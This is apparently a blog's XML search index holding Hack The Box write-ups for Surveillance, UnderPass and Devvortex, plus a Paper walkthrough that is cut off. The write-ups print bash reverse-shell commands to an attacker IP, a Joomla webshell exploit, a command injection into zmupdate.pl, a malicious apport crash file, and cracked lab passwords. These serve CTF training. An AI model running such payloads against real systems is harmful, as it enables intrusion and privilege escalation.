<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB-Surveillance</title>
    <link href="/2025/06/19/HTB-Surveillance/"/>
    <url>/2025/06/19/HTB-Surveillance/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/Surveillance/Pasted-image-20250621145653.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Medium</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>We start by scanning ports:</p><p><img src="/img/Surveillance/Pasted-image-20250618121943.png"></p><p>The <strong>Nmap scan</strong> reveals two open ports on <strong>surveillance.htb (10.10.11.245)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong></li></ul><p> Add :  surveillance.htb to  <strong>&#x2F;etc&#x2F;hosts</strong>:</p> <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.11.254</span>    surveillance.htb<br></code></pre></td></tr></table></figure><p>Port 80 show a website:</p><p><img src="/img/Surveillance/Pasted-image-20250618122020.png"></p><p>Upon inspecting the source code, we can see that the website is powered by Craft CMS version 4.4.14:</p><p><img src="/img/Surveillance/Pasted-image-20250621152234.png"></p><h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h1><h2 id="Shell-as-www-data"><a href="#Shell-as-www-data" class="headerlink" title="Shell as www-data"></a>Shell as www-data</h2><p>Researching this version reveals that Craft CMS 4.4.14 is affected by CVE-2023-41892. This vulnerability allows attackers to bypass the template sandbox restrictions, which are meant to prevent untrusted code from being executed. If a plugin or custom module renders user-controlled templates without proper security checks, an unauthenticated attacker could exploit this flaw to execute arbitrary code on the server, potentially leading to full site compromise.</p><p>Several exploits were tested, including ones available through Metasploit, but none of them worked in this case. However, the exploit from this repository — <a href="https://github.com/0xfalafel/CraftCMS_CVE-2023-41892">https://github.com/0xfalafel/CraftCMS_CVE-2023-41892</a> — successfully exploited the vulnerability on this specific Craft CMS version</p><p>![](&#x2F;img&#x2F;Surveillance&#x2F;Pasted image 20250619151336.png)</p><p>In addition to the default <code>www-data</code> user, we also identified two other local users: <code>matthew</code> and <code>zoneminder</code>.</p><p><img src="/img/Surveillance/Pasted-image-20250619154418.png"></p><h2 id="Shell-as-matthew"><a href="#Shell-as-matthew" class="headerlink" title="Shell as matthew"></a>Shell as matthew</h2><p>While exploring the file system, we discover a ZIP archive containing a database, which may hold credentials or other sensitive information useful for further access.</p><p><img src="/img/Surveillance/Pasted-image-20250619152357.png"></p><p>We unzip the archive and download the database file to our local machine for further analysis:</p><p><img src="/img/Surveillance/Pasted-image-20250619154531.png"></p><p>By searching through the file, we find the SHA-256 password hash for the user <code>matthew</code> :</p><p><img src="/img/Surveillance/Pasted-image-20250619154320.png"></p><p>Next, we use CrackStation to crack the password hash:</p><p><img src="/img/Surveillance/Pasted-image-20250619154216.png"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>Username:matthew<br><span class="hljs-bullet">- </span>Password:starcraft122490<br></code></pre></td></tr></table></figure><p>We successfully log in as Matthew via SSH and find the user flag in his home directory:</p><p><img src="/img/Surveillance/Pasted-image-20250619154146.png"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h2 id="Shell-as-Zoneminder"><a href="#Shell-as-Zoneminder" class="headerlink" title="Shell as Zoneminder"></a>Shell as Zoneminder</h2><p>Running LinPEAS uncovers the presence of a ZoneMinder installation on the target machine:</p><p><img src="/img/Surveillance/Pasted-image-20250621155334.png"></p><p>ZoneMinder is an open-source video surveillance software system that allows users to monitor and record video from security cameras. It is commonly used for home or business security setups, providing features like live streaming, motion detection, and event recording.</p><p><img src="/img/Surveillance/Pasted-image-20250619161308.png"></p><p>We attempted to connect to the database and found a password hash for the admin user, but it couldn’t be cracked :&#x2F; </p><p><img src="/img/Surveillance/Pasted-image-20250621155643.png"></p><p>I proceeded to search through the files to identify the ZoneMinder version and found it by running:</p><p><img src="/img/Surveillance/Pasted-image-20250621155832.png"></p><p>This version, 1.36.32, is vulnerable to <strong>CVE-2023-26035</strong>. This vulnerability allows an attacker to bypass authentication and gain unauthorized access to the ZoneMinder application. Essentially, it means someone could take control of the system without needing valid login credentials, which poses a serious security risk.</p><p>I ran the exploit script from <a href="https://github.com/heapbytes/CVE-2023-26035">this repository</a> with the following command:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python3 poc.py --target http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8888</span><span class="hljs-regexp">/ --cmd &#x27;bash -c &quot;bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-variable">$IP</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><span class="hljs-string">&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>We successfully obtained a shell as the user <code>zoneminder</code>:</p><p><img src="/img/Surveillance/Pasted-image-20250621161116.png"></p><h2 id="Shell-as-root"><a href="#Shell-as-root" class="headerlink" title="Shell as root"></a>Shell as root</h2><p>Looking at the sudo privileges for the <code>zoneminder</code> user, we see that it can run any ZoneMinder Perl script located in <code>/usr/bin/</code> without a password:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">zoneminder<span class="hljs-variable">@surveillance</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> zoneminder on <span class="hljs-symbol">surveillance:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>,<br>    use_pty<br><br><span class="hljs-title class_">User</span> zoneminder may run the following commands on <span class="hljs-symbol">surveillance:</span><br>    (<span class="hljs-title class_">ALL</span> : <span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/zm[a-zA-Z]*.pl *<br><br></code></pre></td></tr></table></figure><p>Examining the Perl scripts, the script <code>zmupdate.pl</code> uses the <code>--pass</code> parameter  to execute MySQL commands, escaping the input with quotes, which provides some sanitization.</p><p>However, the <code>--user</code> parameter  is used without validation, making it vulnerable to command injection:</p><p><img src="/img/Surveillance/Pasted-image-20250621162247.png"></p><p>Now, using the password we found in <code>/usr/share/zoneminder/www/api/app/Config/database.php</code>, we can exploit the vulnerability in the <code>zmupdate.pl</code> script by injecting a payload through the <code>--user</code> parameter:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">zoneminder@surveillance:~$ sudo /usr/bin/zmupdate.pl <span class="hljs-comment">--version 1 --user &#x27; $(chmod u+s /bin/bash)&#x27;</span><br>&lt;ate.pl <span class="hljs-comment">--version 1 --user &#x27; $(chmod u+s /bin/bash)&#x27;</span><br><br>Initiating database upgrade <span class="hljs-built_in">to</span> <span class="hljs-built_in">version</span> <span class="hljs-number">1.36</span><span class="hljs-number">.32</span> <span class="hljs-built_in">from</span> <span class="hljs-built_in">version</span> <span class="hljs-number">1</span><br><br>WARNING - You have specified <span class="hljs-keyword">an</span> upgrade <span class="hljs-built_in">from</span> <span class="hljs-built_in">version</span> <span class="hljs-number">1</span> but <span class="hljs-keyword">the</span> database <span class="hljs-built_in">version</span> found is <span class="hljs-number">1.36</span><span class="hljs-number">.32</span>. Is this correct?<br>Press enter <span class="hljs-built_in">to</span> continue <span class="hljs-keyword">or</span> ctrl-C <span class="hljs-built_in">to</span> abort : <br><br>Do you wish <span class="hljs-built_in">to</span> take <span class="hljs-keyword">a</span> backup <span class="hljs-keyword">of</span> your database prior <span class="hljs-built_in">to</span> upgrading?<br>This may <span class="hljs-built_in">result</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> large <span class="hljs-built_in">file</span> <span class="hljs-keyword">in</span> /tmp/zm <span class="hljs-keyword">if</span> you have <span class="hljs-keyword">a</span> lot <span class="hljs-keyword">of</span> events.<br>Press <span class="hljs-string">&#x27;y&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> backup <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;n&#x27;</span> <span class="hljs-built_in">to</span> continue : n<br><br>Upgrading database <span class="hljs-built_in">to</span> <span class="hljs-built_in">version</span> <span class="hljs-number">1.36</span><span class="hljs-number">.32</span><br>Upgrading DB <span class="hljs-built_in">to</span> <span class="hljs-number">1.26</span><span class="hljs-number">.1</span> <span class="hljs-built_in">from</span> <span class="hljs-number">1.26</span><span class="hljs-number">.0</span><br>ERROR <span class="hljs-number">1698</span> (<span class="hljs-number">28000</span>): Access denied <span class="hljs-keyword">for</span> user <span class="hljs-string">&#x27;-pZoneMinderPassword2023&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span><br>Output: <br>Command <span class="hljs-string">&#x27;mysql -u $(chmod u+s /bin/bash) -p&#x27;</span>ZoneMinderPassword2023<span class="hljs-string">&#x27; -hlocalhost zm &lt; /usr/share/zoneminder/db/zm_update-1.26.1.sql&#x27;</span> exited <span class="hljs-keyword">with</span> status: <span class="hljs-number">1</span><br>zoneminder@surveillance:~$ bash -p<br>bash -p<br>whoami<br>root<br></code></pre></td></tr></table></figure><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :)))"></a>Thanks For Reading :)))</h2><p><img src="/img/Surveillance/totoro.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Medium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB — UnderPass</title>
    <link href="/2025/05/06/HTB-%E2%80%94-UnderPass/"/>
    <url>/2025/05/06/HTB-%E2%80%94-UnderPass/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/Underpass/Underpass.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Easy</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h2><p>I start by scanning ports:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">sudo nmap <span class="hljs-number">10.10.11.48</span> -<span class="hljs-keyword">A</span> -T4<br></code></pre></td></tr></table></figure><p><img src="/img/Underpass/nmap.png"></p><p>The <strong>Nmap scan</strong> reveals three open ports on <strong>paper.htb (10.10.11.143)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong></li></ul><p>Add :  underpass.htb to  <strong>&#x2F;etc&#x2F;hosts</strong>:</p><p><img src="/img/Underpass/host.png"></p><p><strong>Port 80</strong> returns the default Apache2 Ubuntu welcome page, indicating that the web server is up and running but has not been configured to host any custom content:</p><p><img src="/img/Underpass/port80.png"></p><h2 id="Directory-Subdomain-Enumeration"><a href="#Directory-Subdomain-Enumeration" class="headerlink" title="Directory &amp; Subdomain Enumeration:"></a>Directory &amp; Subdomain Enumeration:</h2><p>After attempting directory fuzzing using Feroxbuster, no useful results were discovered:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">feroxbuster -u http:<span class="hljs-regexp">//u</span>nderpass.htb  -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>raft-small-words.txt<br></code></pre></td></tr></table></figure><p><img src="/img/Underpass/domainenum.png"></p><h2 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h2><p>After more enumeration with no results, I decided to run a UDP scan. UDP scans are slower since they don’t always get a response, but they can reveal important services. Here are the results:</p><p><img src="/img/Underpass/udpscan.png"></p><p>UDP port 161 was found open, which is used by the SNMP (Simple Network Management Protocol) service. SNMP is commonly used for managing and monitoring network devices like routers, switches, and servers. If misconfigured, it can expose sensitive information such as system details or network configurations.</p><p>We will use the <code>snmpwalk</code> command for enumeration to gather information about the target system:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">snmpwalk -v<span class="hljs-number">2</span><span class="hljs-keyword">c</span> -<span class="hljs-keyword">c</span> public <span class="hljs-number">10.10</span>.<span class="hljs-number">11.48</span><br></code></pre></td></tr></table></figure><p><img src="/img/Underpass/snmpwalk.png"></p><p>From the output, we can observe that the system contact is <code>steve@underpass.htb</code>, which might be useful for further investigation. Additionally, the message <code>&quot;UnDerPass.htb is the only daloradius server in the basin!&quot;</code> indicates that the system is running <strong>daloRadius</strong>, an open-source RADIUS management tool. This is important because daloRadius is often used for network access control.</p><p>After some searching, I found that the daloRadius server can be accessed via <code>http://underpass.htb/daloradius</code>. Since the system is identified as the only daloRadius server in the network, this could be a key target for further exploration. To dig deeper, we’ll use <strong>feroxbuster</strong> to scan for additional directories under <code>/daloradius</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">feroxbuster -u http:<span class="hljs-regexp">//u</span>nderpass.htb<span class="hljs-regexp">/daloradius  -w /u</span>sr<span class="hljs-regexp">/share/</span>seclists<span class="hljs-regexp">/Discovery/</span>Web-Content/raft-small-words.txt <br></code></pre></td></tr></table></figure><p>The scan revealed a large number of accessible locations, but a few stood out as particularly interesting for further investigation:</p><ul><li><code>http://underpass.htb/daloradius/app/users/</code></li><li><code>http://underpass.htb/daloradius/app/users/include/</code></li><li><code>http://underpass.htb/daloradius/app/users/library/</code></li><li><code>http://underpass.htb/daloradius/app/operators/</code></li><li><code>http://underpass.htb/daloradius/doc/install/INSTALL</code></li><li><code>http://underpass.htb/daloradius/LICENSE</code></li></ul><p>Notably, <code>http://underpass.htb/daloradius/app/users/</code> redirected to a login page:</p><p><img src="/img/Underpass/login.png"></p><p>The file located at <code>http://underpass.htb/daloradius/doc/install/INSTALL</code> contained default credentials commonly used during the initial setup of daloRadius:</p><p><img src="/img/Underpass/doc.png"></p><h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access:"></a>Initial Access:</h1><p>I attempted to log in using the default credentials at <code>/app/users</code>, but they didn’t work—leaving me stuck at this point for a while :))</p><p>So, I decided to manually explore the other discovered directories—and that’s when I came across this:</p><p><img src="/img/Underpass/operators.png"></p><p>After trying the default credentials again, I was finally able to log in :))</p><p><img src="/img/Underpass/radius.png"></p><p>I discovered a registered user entry that included a username along with an MD5 hash:</p><p><img src="/img/Underpass/userregiste.png"></p><p><img src="/img/Underpass/crackstation.png"></p><p>I used CrackStation to crack the MD5 hash, and the credentials obtained were:</p><ul><li><strong>Username:</strong> svcMosh</li><li><strong>Password:</strong> underwaterfriends</li></ul><p>This allowed me to successfully access the system through SSH:</p><p><img src="/img/Underpass/ssh.png"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation:"></a>Privilege Escalation:</h1><p>Once logged in via SSH, I initiated privilege escalation enumeration by running <code>sudo -l</code> to check for any commands the user <strong>svcMosh</strong> could execute with elevated privileges:</p><p><img src="/img/Underpass/sudo-l.png"></p><p>Running <code>sudo -l</code> revealed that the user <strong>svcMosh</strong> can execute <code>/usr/bin/mosh-server</code> with <strong>sudo</strong> privileges <strong>without a password</strong></p><p><strong>mosh-server</strong> is part of the <a href="https://mosh.org/">Mosh (Mobile Shell)</a> system, which is an alternative to SSH that provides more resilience to network issues like disconnections and roaming.</p><p>When run, <code>mosh-server</code> typically spawns a <strong>new shell</strong> session for a user. If a low-privileged user like <code>svcMosh</code> can run <code>mosh-server</code> with <strong>sudo rights and no password</strong>, it might be possible to <strong>invoke a root shell</strong> directly or leverage the command to spawn a privileged shell.</p><p><img src="/img/Underpass/mosh_server.png"><br>This revealed the connection info, including the key and port number (e.g., 60002).<br>As mentioned in this article <a href="https://linux.die.net/man/1/mosh-client">https://linux.die.net/man/1/mosh-client</a>, I can use the <code>mosh-client</code> to connect to the <code>mosh-server</code>. By specifying the connection key (<code>fMez/7xu1NOhnW8cD5RYpQ</code>) and the appropriate IP address and port (<code>127.0.0.1</code> and <code>60002</code>)</p><p><img src="/img/Underpass/exploit.png"></p><p><img src="/img/Underpass/root.png"></p><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :)))"></a>Thanks For Reading :)))</h2><p><img src="/img/Underpass/cat.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Easy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Devvortex</title>
    <link href="/2025/05/04/HTB-Devvortex/"/>
    <url>/2025/05/04/HTB-Devvortex/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/devvortexpic/devvortex.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Easy</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h2><p>I start by scanning ports:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">sudo nmap <span class="hljs-number">10.10.11.242</span> -<span class="hljs-keyword">A</span> -T4<br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/nmap.png"></p><p>The <strong>Nmap scan</strong> reveals two open ports on <strong>devvortex.htb (10.10.11.242)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong></li></ul><h2 id="Web-enumeration"><a href="#Web-enumeration" class="headerlink" title="Web enumeration:"></a>Web enumeration:</h2><p>Now that I have the main domain, I can try to find subdomains by brute-forcing with a wordlist:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span>devvortex.htb<span class="hljs-regexp">/ -H &quot;HOST: FUZZ.devvortex.htb&quot; -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">5000</span>.txt -fs <span class="hljs-number">154</span><br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/subdomains.png"></p><p>I discovered the <code>dev</code> subdomain during the enumeration and added it to <code>/etc/hosts</code></p><p><img src="/img/devvortexpic/webpage.png"></p><p><img src="/img/devvortexpic/devwebpage.png"></p><p>I then used Dirsearch to enumerate directories on <code>http://dev.devvortex.htb</code> :</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//dev.devvortex.htb</span><br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/dirsearch.png"></p><p>Accessing the <code>/administrator/</code> endpoint revealed a Joomla! Administrator login panel. This confirms that the site is built on Joomla, a widely-used CMS with a known history of vulnerabilities — especially if outdated.</p><p><img src="/img/devvortexpic/login.png"></p><h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access:"></a>Initial Access:</h1><p>While examining Joomla’s documentation and deployment structure, I discovered that the version number is exposed at: <code>/administrator/manifests/files/joomla.xml</code> ,which tells us its running joomla version <strong>Joomla 4.2.6</strong>:</p><p><img src="/img/devvortexpic/joomla_ver.png"></p><p>This version is affected by CVE-2023-23752, an unauthenticated information disclosure vulnerability. It allows attackers to retrieve sensitive configuration information such as database credentials, mail server settings, and API keys through a crafted request:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">curl -v <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/dev.devvortex.htb/api</span><span class="hljs-regexp">/index.php/v</span>1/config/application?<span class="hljs-keyword">public</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="/img/devvortexpic/jexploit.png"></p><p>Upon attempting to use these credentials in the Joomla login page, we are able to successfully log in as <code>lewis</code> :</p><p><img src="/img/devvortexpic/admin.png"></p><p>While researching methods to add RCE (Remote Code Execution) to a CMS, I came across this <a href="https://github.com/p0dalirius/Joomla-webshell-plugin">exploit</a> ,which allows an attacker to execute arbitrary code on the Joomla server. </p><p>I cloned the repository and installed the exploit onto the website via the Joomla administrator dashboard. To do this, I navigated to <strong>System &gt; Install - Extensions &gt; Upload Package File</strong>, and uploaded the <code>dist/joomla-webshell-plugin-1.1.0.zip</code> file. Joomla confirmed that the extension was installed successfully. After installation, I proceeded to test the plugin:</p><p><img src="/img/devvortexpic/upload.png"></p><p>To gain a reverse shell, I leveraged the webshell by sending a POST request to its endpoint using <code>curl</code>. The payload executes a bash reverse shell connecting back to my machine on port 4444:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">curl -X POST <span class="hljs-string">&#x27;http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php&#x27;</span> \<br>--data-<span class="hljs-built_in">urlencode</span> <span class="hljs-string">&quot;action=exec&quot;</span> \<br>--data-<span class="hljs-built_in">urlencode</span> <span class="hljs-string">&quot;cmd=bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.49/4444 0&gt;&amp;1&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>And upon executing the command, I successfully received a reverse shell: </p><p><img src="/img/devvortexpic/revshell.png"></p><p>While browsing through the server files, I came across <code>configuration.php</code>. This file contains the MySQL credentials used by Joomla for database access.</p><p><img src="/img/devvortexpic/configuration.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -h localhost -u lewis -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p>After logging in successfully, I listed the tables and identified one of interest:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> sd4fg_users;<br></code></pre></td></tr></table></figure><p>In the results, I found a user named <code>logan</code> along with a hashed password:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">logan : <span class="hljs-variable">$2y</span><span class="hljs-variable">$10</span><span class="hljs-variable">$IT4k5kmSGvHSO9d6M</span><span class="hljs-regexp">/1w0eYiB5Ne9XzArQRFJTGThNiy/y</span>BtkIj12<br></code></pre></td></tr></table></figure><p>I saved the bcrypt hash to a file and used <code>john</code> with the <code>rockyou.txt</code> wordlist to attempt cracking it:</p><p><img src="/img/devvortexpic/crackpass.png"></p><p>Now we can ssh with that password to user logan and retrieve user.txt flag:</p><p><img src="/img/devvortexpic/ssh.png"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation:"></a>Privilege Escalation:</h1><p>During post-exploitation enumeration, it was discovered that the user <code>logan</code> has <code>sudo</code> permissions to run the binary <code>/usr/bin/apport-cli</code> without providing a password:</p><p><img src="/img/devvortexpic/sudo.png"></p><p><code>apport-cli</code> is a command-line interface to the Apport crash-reporting system used in Ubuntu. It is written in Python and is capable of parsing <code>.crash</code> files that include Python-specific metadata.<br>The approach involves crafting a <strong>malicious <code>.crash</code> file</strong> that injects arbitrary Python code. When <code>apport-cli</code> parses this file, it can potentially execute our payload with root privileges.</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix">cat <span class="hljs-operator">&lt;</span><span class="hljs-operator">&lt;</span>EOF <span class="hljs-operator">&gt;</span> <span class="hljs-symbol">/tmp/rootme.crash</span><br><span class="hljs-params">ProblemType:</span> Crash<br><span class="hljs-params">Architecture:</span> amd64<br><span class="hljs-params">DistroRelease:</span> Ubuntu<br><span class="hljs-params">Package:</span> exploit<br><span class="hljs-params">ExecutablePath:</span> <span class="hljs-symbol">/bin/bash</span><br><span class="hljs-params">ProcCmdline:</span> <span class="hljs-symbol">/bin/bash</span><br><span class="hljs-params">PythonArgs:</span> [&#x27;-c&#x27;, &#x27;<span class="hljs-built_in">import</span> os; os.setuid(<span class="hljs-number">0</span>); os.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;]<br>EOF<br></code></pre></td></tr></table></figure><p><strong>Explanation</strong>:</p><ul><li>The <code>PythonArgs</code> field is injected with a payload that spawns a root shell using Python’s <code>os.setuid(0)</code> and <code>os.system(&quot;/bin/bash&quot;)</code>.</li></ul><p>With the malicious file in place, we trigger the binary using the following command:</p><p><img src="/img/devvortexpic/runcmd.png"></p><p>Upon pressing <code>V</code>, the shell executes with the <code>!/bin/bash</code> command, effectively launching a <strong>root shell</strong>:</p><p><img src="/img/devvortexpic/root.png"></p><h2 id="Thanks-For-Reading"><a href="#Thanks-For-Reading" class="headerlink" title="Thanks For Reading :))"></a>Thanks For Reading :))</h2><p><img src="/img/devvortexpic/totoro.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>Linux</tag>
      
      <tag>Easy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Paper</title>
    <link href="/2025/04/20/HTB-Paper/"/>
    <url>/2025/04/20/HTB-Paper/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/paper-htb/paperhtb.png"></p><h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table><thead><tr><th>OS</th><th>Linux</th></tr></thead><tbody><tr><td>Difficulty</td><td>Easy</td></tr></tbody></table><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h2><p>We start by scanning ports:</p><p><img src="/img/paper-htb/nmap.png"></p><p>The <strong>Nmap scan</strong> reveals three open ports on <strong>paper.htb (10.10.11.143)</strong>:</p><ul><li><strong>Port 22 (SSH)</strong> </li><li><strong>Port 80 (HTTP)</strong> </li><li><strong>443 (HTTPS)</strong></li></ul><p> Add :  paper.htb to  <strong>&#x2F;etc&#x2F;hosts</strong>:</p> <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.11.143</span>    paper.htb<br></code></pre></td></tr></table></figure><p>Port 80 show a website:</p><p><img src="/img/paper-htb/website-http.png"></p><p>After conducting some initial enumeration, I did not discover any particularly interesting files or directories. However, I noticed a response header named <code>X-Backend-Server</code> which revealed a domain: <code>office.paper</code></p><p><img src="/img/paper-htb/curl.png"></p><p>We add it into our hosts file:</p><p><img src="/img/paper-htb/hosts.png"></p><h2 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h2><p>After visiting the website we see multiple posts, and we also see in the footer that it is a WordPress site.</p><p><img src="/img/paper-htb/office-paper.png"></p><p>A review of the page’s source code revealed that the application is using WordPress version 5.2.3 (alternatively, we could use WPScan to enumerate and confirm the version).</p><p><img 